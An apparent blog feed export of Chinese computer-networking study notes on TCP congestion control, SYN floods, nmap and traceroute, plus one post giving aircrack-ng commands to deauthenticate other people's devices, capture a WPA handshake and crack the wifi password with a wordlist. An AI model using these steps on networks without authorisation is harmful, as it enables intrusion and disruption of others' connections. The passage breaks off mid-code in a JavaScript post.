alt="tcp-server-stat"></p><p>上图的服务端在监听，如果没有监听呢？服务会发送一个将RST标志为1的回应给客户端，含义是”套接字不存在，别发了”。</p><blockquote><p><em>SYN flood attack</em></p><p>在三次握手中，第二步接到SYN分配缓存和变量，然后等待回应，一个针对这个漏洞的DoS攻击叫SYN洪泛攻击。</p><p>通过发送大量TCP SYN报文段导致服务器资源耗尽。</p><p>有个解决方案就是SYN cookie，在进行第二步时不分配资源；接收到SYN时，将客户IP，端口，和服务器的秘密数使用特殊函数生成一个初始序号发送SYNACK（不保存任何信息）；当接收到回应时，将ACK和IP、端口，和服务器的秘密数生成的结果+1==它的ACK，则代表合法</p></blockquote><h3 id="nmap端口扫描器"><a href="#nmap端口扫描器" class="headerlink" title="nmap端口扫描器"></a>nmap端口扫描器</h3><p>可以得到任何服务器开放的端口，比如获取本机开放的端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">╰─ sudo nmap localhost -O</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-25 23:02 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (127.0.0.1)</span><br><span class="line">Host is up (0.000031s latency).</span><br><span class="line">Other addresses <span class="keyword">for</span> localhost (not scanned): ::1</span><br><span class="line">rDNS record <span class="keyword">for</span> 127.0.0.1: Mydev.localdomain</span><br><span class="line">Not shown: 995 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">23/tcp  open  telnet</span><br><span class="line">25/tcp  open  smtp</span><br><span class="line">587/tcp open  submission</span><br><span class="line">631/tcp open  ipp</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6.32</span><br><span class="line">OS details: Linux 2.6.32</span><br><span class="line">Network Distance: 0 hops</span><br><span class="line"></span><br><span class="line">OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.77 seconds</span><br></pre></td></tr></table></figure><p><em>原理</em></p><p>对目标主机的端口发送TCP SYN，得到输出</p><ul><li>如果是TCP SYNACK，代表该端口打开</li><li>如果是TCP RST，代表端口没打开，同时也代表没有防火墙</li><li>什么也没有，代表有防火墙</li></ul><p>nmap还可以得到UDP的端口，侦测防火墙，操作系统</p><h2 id="3-6-拥塞控制"><a href="#3-6-拥塞控制" class="headerlink" title="3.6-拥塞控制"></a>3.6-拥塞控制</h2><p>重传意味着分组丢失，间接代表网络拥塞。</p><h3 id="控制方法"><a href="#控制方法" class="headerlink" title="控制方法"></a>控制方法</h3><ul><li><strong>端到端拥塞控制</strong>：端系统通过关注时延和丢包来控制发送速率</li><li><strong>网络辅助控制</strong><ul><li>路由器直接反馈发送方它的状态</li><li>接收方反馈网络状态</li></ul></li></ul><h3 id="TCP拥塞控制"><a href="#TCP拥塞控制" class="headerlink" title="TCP拥塞控制"></a>TCP拥塞控制</h3><p>TCP采用的是端到端的拥塞控制，IP不会反馈网络拥塞。</p><p>发送端维护着一个变量叫<strong>拥塞窗口（congestion window）</strong>，cwnd限制了发送端的发送速率。<br>$$<br>LastByteSent-LastByteAcked&lt;=min(cwnd,rwnd)<br>$$<br>如果TCP觉得网络拥塞了，就会自动降低cwnd，网络通畅，增加cwnd。而TCP控制cwnd的原则有以下几点</p><ul><li>报文段丢失，降低cwnd<ul><li>丢包</li><li>得到4个一样的ACK</li></ul></li><li>报文段正确到达，增加cwnd</li></ul><h3 id="拥塞控制算法"><a href="#拥塞控制算法" class="headerlink" title="拥塞控制算法"></a>拥塞控制算法</h3><p>如何伸缩cwnd的细节</p><h4 id="1-慢启动（slow-start"><a href="#1-慢启动（slow-start" class="headerlink" title="1.慢启动（slow-start)"></a>1.慢启动（slow-start)</h4><ul><li><p>cwnd初始值设置为MSS，得到ACK，则设置成2MSS，后面对每个ACK都会增加一个MSS，cwnd呈指数形式增长。</p></li><li><p>如果出现丢包，将变量ssthresh（慢启动阈值）设置为cwnd/2，cwnd设置为1MSS，继续上一步</p></li><li><p>当cwnd&gt;=ssthresh时，<strong>结束慢启动转为拥塞避免状态</strong></p></li><li><p>如果检测3个一样的ACK，则执行快速重传并进入<strong>快速回复</strong>状态</p></li></ul><blockquote><p>为了更高的响应速度，云服务器会采用<strong>TCP分岔</strong>技术</p></blockquote><h4 id="2-拥塞避免"><a href="#2-拥塞避免" class="headerlink" title="2.拥塞避免"></a>2.拥塞避免</h4><ul><li>每次RTT会让cwnd增加一个MSS，假设cwnd是MSS的十倍，则发送10报文，每个ACK会增加1/10的MSS（线性增长）</li><li>出现超时丢包，cwnd设为1，更新ssthresh为cwnd/2，进入<strong>慢启动</strong></li><li>出现3个一样的ACK，ssthresh设为cwnd/2，cwnd设为ssthresh+3MSS，进入<strong>快速回复状态</strong></li></ul><h4 id="3-快速回复"><a href="#3-快速回复" class="headerlink" title="3.快速回复"></a>3.快速回复</h4><ul><li>每得到丢失报文段的ACK，cwnd会增加一个MSS，然后进入<strong>拥塞避免</strong>状态</li><li>如果丢包，ssthresh设cwnd/2，cwnd设置为1MSS，进入<strong>慢启动</strong>状态</li></ul><p>关于上面3个状态的FSM</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/tcp-congestion-fsm.png" alt="tcp-congestion-fsm"></p><h4 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h4><p>如果是3次ACK的丢包事件，TCP的拥塞控制：每个RTT类线性增加1MSS，3次ACK将cwnd减半，因此TCP也叫AIMD（Additive-Increase,Multiplicative-Decrease）拥塞控制方式</p><h4 id="5-TCP吞吐量"><a href="#5-TCP吞吐量" class="headerlink" title="5.TCP吞吐量"></a>5.TCP吞吐量</h4><p>将丢包时的cwnd表示为W，对于一个稳定的精简的模型<br>$$<br>平均吞吐量=（0.75{\times}W）/RTT<br>$$<br>如果丢包率为L<br>$$<br>平均吞吐量=\frac{1.22{\times}MSS}{RTT\surd{L}}<br>$$</p><h4 id="6-TCP和UDP的公平性"><a href="#6-TCP和UDP的公平性" class="headerlink" title="6.TCP和UDP的公平性"></a>6.TCP和UDP的公平性</h4><p>分析过程就不记笔记了，只记结果</p><p>用过拥塞窗口可以看到TCP是比较公平的，会根据拥塞程度适当调整速率，而UDP则是什么都不管，发送就直接发送，可以说UDP会压制链路上TCP的速率</p><p>书上说还是没有好的解决方案，而且就算UDP公平了，TCP的并行连接也是不公平的，他会分到更多的传输速率</p><h2 id="3-7-显示拥塞通知-ECN"><a href="#3-7-显示拥塞通知-ECN" class="headerlink" title="3.7-显示拥塞通知(ECN)"></a>3.7-显示拥塞通知(ECN)</h2><p><strong>Explicit Congestion Notification</strong>允许TCP发送方和接收方直接发送拥塞信号。</p><p>ECN在IP数据报头会有特殊设置位，路由器会根据拥塞情况改变该设置位，当接收主机收到拥塞指示时，将TCP首部标志位ECE(Explicit Congestion Notification Echo)打开，发送方接到该信息就会做出反映，然后在下一个报头设置CWR((Congestion Window Reduced)。</p><h2 id="第三章总结"><a href="#第三章总结" class="headerlink" title="第三章总结"></a>第三章总结</h2><p>首先就是介绍运输层为应用层提供的服务，如UDP是一个很简单的协议，提供的服务也很简单，只传输，不可靠。而TCP提供了数据可靠交付，时延保证，带宽保证。</p><p>因为网络层是不可靠的，有从0开始完成一个在不可靠的层上面完成一个可靠的传输（ACK，重传，定时器等）</p><p>然后学习了TCP的连接管理、流量控制、可靠数据，研究了最初的TCP和升级TCP，以及它的拥塞控制</p><p>可以看到这两个协议还是不完美，新建立的标准的协议有DCCP、SCTP、TFRC等等，应用层度还有待取证</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>一些数据分析对于我来说还是难点，希望自己学完高数后重温这些分析。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> Top-Down-Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCP </tag>
            
            <tag> UDP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2.应用层</title>
      <link href="/Networking/Top-Down-Note/2.%E5%BA%94%E7%94%A8%E5%B1%82.html"/>
      <url>/Networking/Top-Down-Note/2.%E5%BA%94%E7%94%A8%E5%B1%82.html</url>
      
        <content type="html"><![CDATA[<p> 这章主要介绍了网络的应用程序，如Web、电子邮件、DNS、P2P，还有套接字(socket)</p><span id="more"></span><h2 id="2-2-1-网络应用程序体系结构"><a href="#2-2-1-网络应用程序体系结构" class="headerlink" title="2.2.1-网络应用程序体系结构"></a>2.2.1-网络应用程序体系结构</h2><p>一个应用程序也有自己的体系结构，不同于网络的结构（5层）。应用程序体系结构由开发者自己设计，可能还会利用CS（client-server）和P2P结构。</p><p>在CS结构中，有一个主机用来接收所有客户的主机的请求，如Web、FTP、Telent、电子邮件，而这个存储数据的主机如果仅是一台的话肯定是跟不上客户的请求的，所以服务端通常配备了大量的主机主机组成数据中心然后创建强大的虚拟服务器。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> Top-Down-Note </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>1.计算机网络与因特网</title>
      <link href="/Networking/Top-Down-Note/1.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%8E%E5%9B%A0%E7%89%B9%E7%BD%91.html"/>
      <url>/Networking/Top-Down-Note/1.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%8E%E5%9B%A0%E7%89%B9%E7%BD%91.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考《计算机网络自顶向下方法》</p></blockquote><span id="more"></span><h2 id="1-1基础概念"><a href="#1-1基础概念" class="headerlink" title="1.1基础概念"></a>1.1基础概念</h2><p>介绍网络的基本构成与一些专业术语</p><h3 id="1-1-1-网络构成"><a href="#1-1-1-网络构成" class="headerlink" title="1.1.1-网络构成"></a>1.1.1-网络构成</h3><p>因特网是一个世界范围的计算机网络。我们将接入因特网的设备称为<strong>主机（host）</strong>或者<strong>端系统（end system）</strong>，因为他们处于网络边缘。</p><p>每个主机通过<strong>通信链路（communication link）</strong>和<strong>分组交换机（packet switch）</strong>连接在一起。</p><p>通信链路由各种物理媒体组成，同轴电缆、铜线、光纤、无线电频谱。当主机发送数据时，会将数据拆成段并为每段加工一些信息成为信息包，我们称为<strong>分组（packet）</strong>，到达目的主机再重组。</p><p>分组交换机从通信链路接收分组，从另一条链路发送分组。比较著名的交换机类型是<strong>路由器（router）</strong>和<strong>链路层交换机（link-layer switch）</strong>，链路交换机通常用于接入，路由器通常在网络核心。一个分组将经历一系列网络路径到达目的主机。</p><p>主机通过<strong>因特网服务提供商（Internet Service Provider,ISP）</strong>接入因特网，因为主机之间需要互联，所以ISP之间也会通过国家、国际的ISP连接。</p><p>主机、交换机等其他网络设备都要遵循一系列协议，用来控制接收和发送，如<strong>TCP/IP</strong>。协议的标准由许多组织规定，如因特网标准由IETE研发，IEEE 802制定了无线wifi的标准。</p><h3 id="1-1-2-服务"><a href="#1-1-2-服务" class="headerlink" title="1.1.2-服务"></a>1.1.2-服务</h3><p>主机上的软件如何与目标主机的软件通信呢？每个主机都提供了一套因特网API，使用这些API写的软件就可以与其他主机上的软件进行通信。</p><h3 id="1-1-3-协议"><a href="#1-1-3-协议" class="headerlink" title="1.1.3-协议"></a>1.1.3-协议</h3><p>使用人类之间交流来理解计算机协议，比如小明想小红现在几点了，首先她们都要有时间的概念，其次她们能听懂各自说的话，才能够正常交流。</p><p>网络协议定义了多个通信实体之间的交换的报文（数据块）格式和次序，以及发送/接收或其他事件采取的动作</p><h2 id="1-2-网络边缘"><a href="#1-2-网络边缘" class="headerlink" title="1.2-网络边缘"></a>1.2-网络边缘</h2><p>边缘指的就是与互联网相连的计算机，他们处于因特网的边缘，所以被称为端系统。端系统=主机</p><p>主机里有各种应用程序，主机再细分为<strong>客户（client）</strong>和<strong>服务器（server）</strong>，服务器相当于性能强大的机器。</p><h3 id="1-2-1-接入网"><a href="#1-2-1-接入网" class="headerlink" title="1.2.1-接入网"></a>1.2.1-接入网</h3><p>主要指<strong>边缘路由器（edge router）</strong>，主机网络路径上的第一台路由器</p><p>家庭接入</p><p>1.DSL</p><p>住宅可以从提供本地电话接入的电话公司获取数字用户线（Digital Subscriber Line）因特网接入，家庭DSL调制解调器得到数字数据并转化为高频音，中心局的DSLAM接收模拟信号后转化为数字数据。</p><p>当上行和下行速率不一样时叫非对称DSL</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/DSL.png" alt="DSL"></p><p>2.电缆</p><p>从提供有线电视的公司可以获得电缆因特网接入（cabl internet access），通过光缆连接电缆头端到光纤节点，再使用同轴电缆连接到家家户户，也被称为混合光纤同轴（Hybrid Fiber Coax，HFC）。</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/%E7%94%B5%E7%BC%86.png" alt=""></p><p>类似于DSL modem，电缆也需要电缆调制解调器（cable modem），而电缆调制解调器终端系统（Cable Modem Termination System,CMTS）则和DSLAM的功能类似。Modem将HFC划分了上行和下行信道，下行的传输速率被通常比上行高很多。</p><p>3.FTTH</p><p>光纤到户（Fiber To The Home）又分为主动光纤网络（Active Optical Network）和被动光纤网络（Passive Optical Network）。</p><p>PON结构如下，ONT（Optical Nerwork Terminator）连接到分配器，OLT（Optical Line Terminator）可以在光信号和电信号之间转换。<img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/FTTP.png" alt=""></p><p>FTTH有着速率高的优点（当然更贵）。</p><p>在无法提供DSL、线缆、FTTH的地方，使用卫星链路与因特网相连。</p><p>企业接入：以太网、WIFI</p><p>实际上越来越多的家庭和校园都使用了局域网技术</p><p>广域无线接入：3G、LTF</p><h2 id="1-2-2-物理媒体"><a href="#1-2-2-物理媒体" class="headerlink" title="1.2.2-物理媒体"></a>1.2.2-物理媒体</h2><p>1.双绞铜线 </p><p>由两根隔离的铜线组成，每根大约1mm粗，以规则的螺旋形式排列，可以减少电气干扰，通常使用许多双绞线捆扎成一根电缆，覆上保护层，就是一条通信链路。而无屏蔽双绞线（Unshielded Twisted Pair）则用在建筑物内。传输速率在10Mbps与10Gbps之间</p><p>2.同轴电缆</p><p>使用两个铜导体组成同心的电缆，通常用于电视系统，速率通常在几十Mbps</p><p>3.光纤</p><p>光纤有着细而柔软的，能够引起光脉冲的身体，每个脉冲代表1bit，速率可以高达100Gbps。信号不易被干扰、衰弱，窃听难。</p><p>4.陆地无线电信道</p><p>包含电磁频谱的信号，信号能穿墙、距离远，但很依赖环境</p><p>5.卫星无线电信道</p><p>通信中常使用同步卫星和近地卫星</p><h2 id="1-3-网络核心"><a href="#1-3-网络核心" class="headerlink" title="1.3-网络核心"></a>1.3-网络核心</h2><h3 id="1-3-1-分组交换"><a href="#1-3-1-分组交换" class="headerlink" title="1.3.1-分组交换"></a>1.3.1-分组交换</h3><p>从源主机发送一个文件（报文message）时，需要将它划分成小的数据块，称为分组（packet）。该文件（报文）在传输过程中，分组（数据包）需要经过通信链路和分组交换机（packet switch）</p><ol><li>存储-转发传输</li></ol><p>指交换机必须接收完整个分组才能向下一条链路传输。</p><p>计算发送数据时端到端的延迟（只考虑传输延迟）</p><p>假设源与目标之间有着$N$条链路（N-1交换机），分组长度$L$(bit)，链路速率$R$(bps)，需要传输$P$个分组。</p><p>分析：</p><p>当时间处于$N(L/R)$时，第一个包到达，$N(L/R)+(L/R)$时，第二个包到达，以此类推，当处于$N(L/R)+(P-1)(L/R)$时，全部到达，所以有公式<br>$$<br>d_{end-end}=N*(L/R)+(P-1)(L/R)<br>$$</p><ol start="2"><li>排队延迟与丢包</li></ol><p>因为需要存储，所以分组交换机有个输出缓存（buffer），用来决定该分组该发往哪条链路。当分组交换机正在发送其他分组时，后面来的分组就必须等待，等待的这个时间就叫<strong>排队延迟（queue delay）</strong>。</p><p>这个延迟的特点就是随机性变化，主要取决于网络的拥塞程度。此外，因为缓存是有限的，还会出现<strong>丢包（packet lost）</strong></p><ol start="3"><li>转发表和路由选择协议</li></ol><p>分组头部包含了目的地的IP，而每台路由器有一个转发表（forwarding table），可以将IP映射成输出链路，通常都会选择最近的路径进行传输</p><h3 id="1-3-2-电路交换"><a href="#1-3-2-电路交换" class="headerlink" title="1.3.2-电路交换"></a>1.3.2-电路交换</h3><p>类似于通话，电路交换会先建立一条连接，在连接时预留了恒定的传输速率，所以发送方可以以恒定额速率向接收方传送数据。</p><p>为了扩大一条链路的用户，电路交换使用了频分复用FDM和时分复用TDM（原理我已经在其他笔记写明）</p><h3 id="1-3-3-两者对比"><a href="#1-3-3-两者对比" class="headerlink" title="1.3.3-两者对比"></a>1.3.3-两者对比</h3><p>对于它们两个的区别可以通过一个例子说明</p><p>假设有多个用户共享一条1Mbps链路，每个用户要么以100kbps的恒定速率产生数据，要么不产生数据，假如只用10%的用户活跃。</p><ul><li>采用电路交换，则该链路仅支持10(1Mbps/1kbps)个并发（同时工作）的用户</li><li>使用分组交换，活跃率0.1，假如有35个用户，有11个以上的并发用户概率是0.0004（使用了二项式与中心极限定理），当有10个并发用户时，与电路交换基本一样。当超过10个时，输出队列变长，即使支持多个用户，性能不变（但概率是极小的），这种情况和电路的性能一样。</li></ul><p>但是如果用户低于10个，假定某一个用户（其他人休息）产生了1000个1000bit的分组，在使用电路交换时，依旧使用100kbps的速率（其他频段、时隙空闲着），需要10s；而使用分组交换，则可以使用这条链路的最大速率即1Mbps，只需要1s。</p><p>总的来说分组的优势是效率，电路的优势是稳定</p><h2 id="1-4-分组"><a href="#1-4-分组" class="headerlink" title="1.4-分组"></a>1.4-分组</h2><p>了解分组的时延、丢包、和吞吐量</p><h3 id="1-4-1-时延"><a href="#1-4-1-时延" class="headerlink" title="1.4.1-时延"></a>1.4.1-时延</h3><p>也就是数据从源出发，到达目的地的时间。时延又分为<strong>结点处理时延（nodal processing delay）、排队时延（queuing delay）、传输时延（transmission delay）、传播延迟（propagation delay）</strong>。</p><ul><li>处理时延：路由检查分组和决定发送目标</li><li>排队时延：指在流量大时分组在路由停留的时间</li><li>传输时延：指源将分组送到链路上的时间</li><li>传播时延：指在链路上传播的时间（与距离和光速有关）</li></ul><p>总时延：<br>$$<br>d_{nodal}=d_{proc}+d_{queue}+d_{trans}+d_{prop}<br>$$</p><h3 id="1-4-2-排队时延和丢包"><a href="#1-4-2-排队时延和丢包" class="headerlink" title="1.4.2-排队时延和丢包"></a>1.4.2-排队时延和丢包</h3><p>值得研究的是排队时延，它与主要与流量的速率、链路的传输速率有关。</p><p>假设$a$表示分组到达速率（pkt/s），$R$是传输速率，每个分组有$L$ bit。</p><p>则有$La/R$代表路由的流量强度</p><ul><li>&gt;1代表到达速率大于传输速率，此时排队时延将接近无穷大，因为发送慢</li></ul><p><strong>丢包</strong></p><p>当排队的队伍满了（缓存满了），后面到达的分组就没有位置排队，造成分组丢失</p><h3 id="1-4-3-端到端的时延"><a href="#1-4-3-端到端的时延" class="headerlink" title="1.4.3-端到端的时延"></a>1.4.3-端到端的时延</h3><p>假设端与端之间存在了n-1的路由器（n条链路），这里不考虑排队，太复杂<br>$$<br>d_{end-end}=N(d_{proc}+d_{trans}+d_{prop})<br>$$<br><strong>Traceroute工具</strong></p><p>可以对输入的地址发送多个分组，然后报告三次往返时间（*代表丢包）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># manu @ MY in ~ [15:00:52] C:2</span></span><br><span class="line">$ traceroute yangchaohe.com</span><br><span class="line">traceroute to yangchaohe.com (185.199.109.153), 30 hops max, 60 byte packets</span><br><span class="line"> 1  TianYi.Home (192.168.1.1)  1.918 ms  2.114 ms  2.373 ms</span><br><span class="line"> 2  100.64.0.1 (100.64.0.1)  25.693 ms  25.683 ms  26.056 ms</span><br><span class="line"> 3  61.159.144.33 (61.159.144.33)  6.670 ms  6.654 ms  6.619 ms</span><br><span class="line"> 4  61.159.144.65 (61.159.144.65)  14.496 ms  15.063 ms  15.043 ms</span><br><span class="line"> 5  202.97.69.93 (202.97.69.93)  35.400 ms  35.331 ms  35.339 ms</span><br><span class="line"> 6  202.97.94.138 (202.97.94.138)  32.900 ms  36.775 ms  36.533 ms</span><br><span class="line"> 7  202.97.12.37 (202.97.12.37)  47.054 ms * 202.97.12.45 (202.97.12.45)  36.031 ms</span><br><span class="line"> 8  xe-0-0-6.r27.tokyjp05.jp.bb.gin.ntt.net (129.250.66.9)  151.965 ms  151.439 ms  150.848 ms</span><br><span class="line"> 9  ae-2.r31.tokyjp05.jp.bb.gin.ntt.net (129.250.2.155)  157.396 ms ae-1.r30.tokyjp05.jp.bb.gin.ntt.net (129.250.2.157)  151.674 ms *</span><br><span class="line">10  ae-3.r01.tokyjp08.jp.bb.gin.ntt.net (129.250.6.133)  152.397 ms  152.126 ms  152.090 ms</span><br><span class="line">11  * * *</span><br><span class="line">12  * * *</span><br><span class="line">13  * * *</span><br><span class="line">14  * * *</span><br><span class="line">15  * * *</span><br><span class="line">16  * * *</span><br><span class="line">17  * * *</span><br><span class="line">18  * * *</span><br><span class="line">19  * * *</span><br><span class="line">20  * * *</span><br><span class="line">21  * * *</span><br><span class="line">22  * * *</span><br><span class="line">23  * * *</span><br><span class="line">24  * * *</span><br><span class="line">25  * * *</span><br><span class="line">26  * * *</span><br><span class="line">27  * * *</span><br><span class="line">28  * * *</span><br><span class="line">29  * * *</span><br><span class="line">30  * * *</span><br></pre></td></tr></table></figure><p>除了指令还有网站可以测试<a href="http://www.traceroute.org">http://www.traceroute.org</a></p><h3 id="1-4-4-吞吐量"><a href="#1-4-4-吞吐量" class="headerlink" title="1.4.4-吞吐量"></a>1.4.4-吞吐量</h3><p>就是网速，有平均吞吐量和瞬时吞吐量</p><p>下面是书上深入介绍吞吐量的例子</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/tuntuliang.png" alt=""></p><p>因为$R_{s}$与$R_{c}$的速率不一样，所以吞吐量=$min{R_{c},R_{s}}$，因为因特网的带宽很大，通常只考虑接入速率</p><h2 id="1-5-区分各层数据单位"><a href="#1-5-区分各层数据单位" class="headerlink" title="1.5-区分各层数据单位"></a>1.5-区分各层数据单位</h2><p>摘自百度百科：协议数据单元PDU（Protocol Data Unit）是指对等层次之间传递的数据单位。 协议数据单元(Protocol Data Unit )物理层的 PDU是数据位（bit），数据链路层的 PDU是数据帧（frame），网络层的PDU是数据包（packet），传输层的 PDU是数据段（segment），其他更高层次的PDU是报文（message）。<br>说白了，pdu就是某协议发送数据的基本单位，各协议有各自的格式。实际使用中其实很多人其实不太分这么细，统一称作数据包。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> Top-Down-Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 协议 </tag>
            
            <tag> 服务 </tag>
            
            <tag> 分组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>aircrack-ng破解wifi</title>
      <link href="/TechnicalExperience/Penetration/aircrack-ng.html"/>
      <url>/TechnicalExperience/Penetration/aircrack-ng.html</url>
      
        <content type="html"><![CDATA[<p>但是使用wifiphisher的情况并没有我想象的那样强大，应该是我的操作问题吧，只是生成了一个假热点，并将用户重定向至钓鱼页面，并没有断开连接原来wifi的设备</p><p>在查找资料时碰到了这个工具包，有一个功能就是强制断开他人的wifi，挺有趣的记下笔记</p><span id="more"></span><p>使用前提，支持监听注入的网卡</p><h2 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h2><p>使用<code>iwconfig</code>查看网卡加载情况</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/iwconfig.png" alt=""></p><h2 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h2><p><code>airmon-ng check kill</code>杀掉所有网络进程</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/kill-net.png" alt=""></p><p>如果杀掉后自动启动的话，建议使用<code>systemctl stop</code>杀得彻底些</p><h2 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h2><p><code>airmon-ng start wlp0s20f0u1</code>启动网卡监听模块</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/start-mon.png" alt=""></p><p>注意网卡名字会变成<code>wlp0s20f0u1mon</code></p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/monitor.png" alt=""></p><h2 id="step4"><a href="#step4" class="headerlink" title="step4"></a>step4</h2><p><code>airodump-ng wlp0s20f0u1mon</code>开始监听</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/net-monitor.png" alt=""></p><ul><li>PWR是信号强度，越小信号越强</li><li>CH代表信道</li></ul><h2 id="step5"><a href="#step5" class="headerlink" title="step5"></a>step5</h2><p><code>airodump-ng -c 6 --bssid 网络mac地址 -w filename wlp0s20f0u1mon</code>开始抓包</p><ul><li>-c，指的是信道CH</li><li>–bssid，指的是AP mac地址</li><li>-w，输出的文件路径</li></ul><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/airodump-ng.png" alt=""></p><p><code>STATION</code>代表的是设备mac，由几个mac就代表有几个设备</p><p>当有设备重新连接时，就会抓到握手包，放到<code>-w</code>指定的文件里，下一步介绍强制掉线</p><h2 id="step6"><a href="#step6" class="headerlink" title="step6"></a>step6</h2><p><code>aireplay-ng -0 0 -a AP_mac -c 设备mac wlp0s20f0u1mon</code>强制wifi掉线</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/aireplay-ng.png" alt=""></p><p>重连时就会抓到握手包</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/handsnake.png" alt=""></p><h2 id="step7"><a href="#step7" class="headerlink" title="step7"></a>step7</h2><p><code>aircrack-ng -a2 -b AP_mac -w 字典.txt filename.cap</code>跑字典，爆破密码</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://blog.csdn.net/nuoya_1995/article/details/52402728">【无线攻防】使用aircrack-ng工具破解wifi密码</a></p>]]></content>
      
      
      <categories>
          
          <category> 个人技术心得 </category>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> aircrack-ng </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS学习之异步</title>
      <link href="/Front-end/JavaScript/%E5%BC%82%E6%AD%A5.html"/>
      <url>/Front-end/JavaScript/%E5%BC%82%E6%AD%A5.html</url>
      
        <content type="html"><![CDATA[<p>JavaScript是单线程的，很多任务都是堆到这个线程上的，然后一个一个的解决。</p><p>这就导致了一些问题，比如当前面有一个函数在做复杂运算时，没有将控制权返回浏览器，那么此时你无法在做其他的事，这叫<strong>阻塞</strong>。下面是官方给出的一个例子</p><span id="more"></span><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;wrapper&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&#x27;btn&#x27;</span>&gt;</span>Click<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> wp = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;.wrapper&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> btn = <span 